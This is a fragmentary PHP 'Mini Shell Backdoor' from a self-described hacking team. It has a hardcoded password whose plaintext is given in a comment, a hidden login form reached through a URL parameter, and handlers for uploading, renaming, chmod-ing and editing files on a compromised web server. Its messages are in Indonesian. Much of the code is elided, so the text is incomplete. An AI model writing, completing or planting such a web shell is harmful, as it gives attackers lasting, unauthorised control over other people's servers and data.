...
/*
        ...
        Mini Shell Backdoor
        Recode by       : SanSORiugan       
        Version         : 1.0                                                                      
        Team            : CH40$ PH4NT30N - GARUDA SECURITY HACKER 
...
$auth_pass = "7a634043d3c81b6b6764c9fa4b136a25"; // pass : CH40$
...
if($_GET['ez'] == 'login')
{
echo '<br><br><br><br><br><center><form method="post"><input type="password" name="pass"><button>Hai gan?</button></form></center>';
}
?>
<?php
exit;
...
body{
        font-family: Rye;
        background-image: url("https://preview.ibb.co/h643B8/chaospanteon.jpg");
        color:purple;
...
<body>
<center><font color="violet" size="7" face="Fredericka the Great">|&hearts;| MINI SH3LL CH40$ PH4NT30N |&hearts;|</font></center><br>
...
echo '<script>alert("Upload Sukses gan!");</script>';
}else{
echo '<script>alert("Gagal Upload gan :(");</script>';
}
}
...
echo '<script>alert("Change Permission Sukses gan!!");</script>';
}else{
echo '<script>alert("Gak bisa Change Permission gan :( ");</script>';
}
}
echo '<form method="POST">
...
echo '<script>alert("Ganti Nama Sukses gan!! ");</script>';
}else{
echo '<script>alert("Gak bisa Ganti Nama gan :( ");</script>';
}
...
echo '<script>alert("Edit File Sukses gan ! ");</script>';
}else{
echo '<script>alert("Gak bisa Di Edit gan :( ");</script>';
}
fclose($fp);
}
echo '<form method="POST">
...
////////////////////////////////////////
echo '<center><br><br>Copyright &copy; 2018 CH40$ PH4NT30N |  style="text-decoration:none;">Thank to : Garuda Security Hacker</a></center>';
?>